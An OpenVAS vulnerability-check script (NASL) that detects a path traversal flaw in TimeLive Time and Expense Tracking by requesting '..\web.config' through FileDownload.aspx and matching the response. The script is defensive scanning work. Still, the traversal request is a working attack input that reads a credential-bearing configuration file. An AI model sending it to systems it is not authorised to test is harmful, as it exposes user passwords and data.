###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_timelive_time_and_expense_tracking_mult_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# TimeLive Time and Expense Tracking Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902481");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-09-30 15:58:03 +0200 (Fri, 30 Sep 2011)");
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_name("TimeLive Time and Expense Tracking Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17900/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/105363/timelivetet-traversaldisclose.txt");
  script_xref(name:"URL", value:"http://securityswebblog.blogspot.com/2011/09/timelive-time-and-expense-tracking-411.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("General");
  script_dependencies("secpod_timelive_time_n_expense_tracking_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to download the
complete database of users information including email addresses, usernames
and passwords and associated timesheet and expense data.");
  script_tag(name:"affected", value:"TimeLive Time and Expense Tracking version 4.2.1 and prior.");
  script_tag(name:"insight", value:"Multiple flaws are due to an error in 'FileDownload.aspx', when
processing the 'FileName' parameter.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running TimeLive Time and Expense Tracking and is prone
to multiple vulnerabilities.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

tlPort = get_http_port(default:80);
if(!tlPort){
  exit(0);
}

if(!dir = get_dir_from_kb(port:tlPort, app:"TimeLive")){
  exit(0);
}

sndReq = http_get(item:string(dir, "/Shared/FileDownload.aspx?FileName" +
                  "=..\web.config"), port:tlPort);
rcvRes = http_send_recv(port:tlPort, data:sndReq);

if('All Events' >< rcvRes && 'Logging Application Block' >< rcvRes){
  security_message(tlPort);
}
